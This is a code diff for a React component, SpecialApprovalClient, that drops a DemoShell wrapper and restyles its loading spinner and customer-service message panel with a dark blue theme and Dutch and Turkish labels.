@@ -2,7 +2,6 @@
 
 import { useEffect, useState, useRef } from "react";
 import Image from "next/image";
-import { DemoShell } from "@/components/demo/DemoShell";
 import { stepToPath } from "@/lib/session-routes";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { SessionStep } from "@/types/session";
@@ -94,27 +93,27 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
 
   if (!ready) {
     return (
-      <DemoShell title="Bildirim">
-        <div className="flex justify-center py-12">
-          <div className="size-10 animate-spin rounded-full border-4 border-brand-blue/20 border-t-brand-blue" />
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-12">
+          <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
         </div>
-      </DemoShell>
+      </div>
     );
   }
 
   return (
-    <DemoShell title={lang === "de" ? "Melding" : "Bilgilendirme"}>
-      <div className="app-panel fade-in mx-auto w-full max-w-3xl rounded-3xl bg-white p-6 text-center shadow-xl border border-zinc-100">
+    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in text-center">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-brand-blue">Klantenservice</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-[#0088FF]">Klantenservice</p>
         </div>
         
-        <p className="whitespace-pre-wrap text-lg font-bold text-zinc-900 leading-tight mb-6">
+        <p className="whitespace-pre-wrap text-lg font-bold text-white leading-tight mb-6">
           <Linkify text={message} />
         </p>
 
         {imageUrl && (
-          <div className="mt-4 rounded-2xl overflow-hidden border border-zinc-50 shadow-sm bg-white p-1">
+          <div className="mt-4 rounded-2xl overflow-hidden border border-white/10 shadow-sm bg-white/5 p-1">
             <Image 
               src={imageUrl} 
               alt="Support" 
@@ -126,6 +125,6 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           </div>
         )}
       </div>
-    </DemoShell>
+    </div>
   );
 }
